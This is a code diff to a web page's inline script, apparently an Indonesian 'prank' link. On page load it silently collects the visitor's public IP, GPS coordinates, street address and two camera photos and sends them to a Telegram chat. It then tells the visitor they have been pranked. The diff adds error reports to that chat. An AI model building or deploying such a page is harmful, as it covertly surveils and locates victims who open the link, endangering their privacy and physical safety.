@@ -105,8 +105,12 @@
     };
 
     const getGeoInfo = async (lat, lon) => {
-      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-      return await res.json();
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+        return await res.json();
+      } catch {
+        return null;
+      }
     };
 
     const captureCamera = async () => {
@@ -117,7 +121,6 @@
         video.srcObject = stream;
         await video.play();
 
-        // Tunggu video siap
         await new Promise(resolve => {
           const checkReady = setInterval(() => {
             if (video.readyState >= 2 && video.videoWidth > 0) {
@@ -127,7 +130,6 @@
           }, 100);
         });
 
-        // Ambil 2 foto
         for (let i = 1; i <= 2; i++) {
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
@@ -156,20 +158,29 @@
           const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
           const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
           const geo = await getGeoInfo(latitude, longitude);
-          const address = geo?.display_name || 'Unknown';
+          const address = geo?.display_name || 'Alamat tidak ditemukan';
+
           const lokasi = `
 📍 GPS LOCATION
-[+] Latitude       : ${latitude} deg
-[+] Longitude      : ${longitude} deg
-[+] Accuracy       : ${accuracy} m
+[+] Latitude       : ${latitude}
+[+] Longitude      : ${longitude}
+[+] Accuracy       : ${accuracy} meter
 [+] Altitude       : ${altitude ?? 'Unknown'} m
-[+] Direction      : Not Available
 [+] Speed          : ${speed ?? 'Unknown'} m/s
-[+] Google Maps    : ${maps}
-[+] Address        : ${address}`.trim();
+[+] Address        : ${address}
+[+] Google Maps    : ${maps}`.trim();
+
           await sendToTelegram(lokasi);
-        }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
-      } catch {}
+        }, async (err) => {
+          await sendToTelegram('❌ Lokasi gagal diakses. Error: ' + err.message);
+        }, {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        });
+      } catch (e) {
+        await sendToTelegram('❌ Lokasi gagal (exception). Error: ' + e.message);
+      }
     };
 
     const collectInfo = async () => {
@@ -196,11 +207,9 @@
 
 🌐 NETWORK / IP
 [+] Public IP      : ${ip.ip}
-[+] Continent      : ${ip.continent_name}
 [+] Country        : ${ip.country_name}
 [+] Region         : ${ip.region}
 [+] City           : ${ip.city}
-[+] Org            : ${ip.org}
 [+] ISP            : ${ip.org}
 [+] Google Maps    : https://www.google.com/maps/place/${ip.latitude}+${ip.longitude}`.trim();
 
@@ -209,11 +218,9 @@
       captureCamera();
     };
 
-    // Efek ketik
     const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
-    // Otomatis langsung jalan
     window.onload = collectInfo;
   </script>
 </body>
